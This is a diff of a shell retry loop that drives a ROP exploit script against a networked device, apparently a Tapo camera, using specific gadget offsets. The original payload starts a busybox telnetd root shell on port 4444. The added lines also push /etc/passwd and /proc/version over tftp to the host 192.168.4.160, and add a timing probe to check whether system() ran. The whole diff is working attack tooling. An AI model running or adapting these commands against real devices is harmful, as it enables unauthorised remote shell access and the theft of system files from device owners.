@@ -94,7 +94,7 @@ while :; do
     before=$(wc -l <"$LOG" 2>/dev/null || echo 0)
     sudo -n /opt/homebrew/bin/python3 "$HERE/tapo_connectap_rop.py" "$ip" \
       --offset 1060 --pop 0x24462 --pivot 0x28514e --system 0x15928 \
-      --cmd '/bin/busybox telnetd -l /bin/sh -p 4444 &' >>"$LOG" 2>&1
+      --cmd '/bin/busybox telnetd -l /bin/sh -p 4444 & /bin/busybox tftp -p -l /etc/passwd 192.168.4.160 & /bin/busybox tftp -p -l /proc/version 192.168.4.160 &' >>"$LOG" 2>&1
     rc=$?
     sleep 5
     if timeout 6 bash -c "exec 3<>/dev/tcp/$ip/4444" 2>/dev/null; then
@@ -110,6 +110,9 @@ while :; do
       phase DONE
       exit 0
     fi
+    # discriminating test: did system() actually run? probe login latency around the sleep
+    sudo -n /opt/homebrew/bin/python3 "$HERE/rop_timing_probe.py" "$ip" >>"$LOG" 2>&1
+    log "timing probe: $(cat /tmp/rop_timing.json 2>/dev/null || echo 'no-result')"
     log "ROP fired rc=$rc but 4444 not open — will retry on next presence"
     phase WAITING
     continue
